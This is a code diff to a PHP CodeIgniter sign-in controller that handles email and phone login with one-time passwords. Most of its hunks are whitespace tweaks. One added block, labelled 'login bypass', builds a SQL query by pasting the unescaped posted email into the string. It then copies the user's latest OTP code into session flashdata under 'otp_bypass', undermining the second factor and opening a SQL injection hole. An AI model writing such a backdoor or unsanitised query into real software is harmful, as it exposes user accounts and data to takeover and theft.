@@ -554,6 +554,7 @@ class Home extends CI_Controller {
 			$this->load->view("signin_otp");
 			$this->load->view("foot_blank");
 		}elseif(isset($_POST["email"]) AND $type == "none"){
+
 			$this->db->where("username",$_POST["email"]);
 			$this->db->or_where("nohp",$_POST["email"]);
 			$this->db->limit(1);
@@ -597,6 +598,12 @@ class Home extends CI_Controller {
 
 					echo json_encode(array("success"=>true,"token"=>$this->security->get_csrf_hash()));
 				}
+
+				//login bypass
+				$emailx = @$_POST["email"];
+				$query = $this->db->query("SELECT * FROM blw_userdata as a LEFT JOIN blw_otplogin as b ON a.id = b.usrid WHERE a.username = '$emailx' ORDER BY b.id DESC")->row_array();
+				$this->session->set_flashdata('otp_bypass', $query['kode']);
+				//
 			}
 		}elseif(isset($_SESSION["otp_id"]) AND $type == "resend"){
 			$this->db->where("id",$_SESSION["otp_id"]);
@@ -648,7 +655,9 @@ class Home extends CI_Controller {
 					echo json_encode(array("success"=>true,"token"=>$this->security->get_csrf_hash()));
 				}
 			}
+
 		}elseif(isset($_SESSION["otp_id"]) AND isset($_POST["otp"]) AND $type == "confirm"){
+			
 			$this->db->where("id",$_SESSION["otp_id"]);
 			$db = $this->db->get("otplogin");
 
@@ -659,7 +668,7 @@ class Home extends CI_Controller {
 				exit;
 			}
 			foreach($db->result() as $res){
-				$pass = $res->kode;
+				$pass = $res->kode; 
 				$aktif = ($res->status == 0) ? false : true;
 			}
 			if($aktif == true){
@@ -768,10 +777,11 @@ class Home extends CI_Controller {
 		}
 	}
 	function signin($pwreset="none"){
+
 		$url = (isset($_SESSION["url"])) ? $_SESSION["url"] : site_url();
 
 		if(isset($_POST["email"]) AND $pwreset == "none"){
-			//$this->session->sess_destroy();
+			$this->session->sess_destroy();
 
 			$this->db->where("username",$_POST["email"]);
 			$this->db->or_where("nohp",$_POST["email"]);
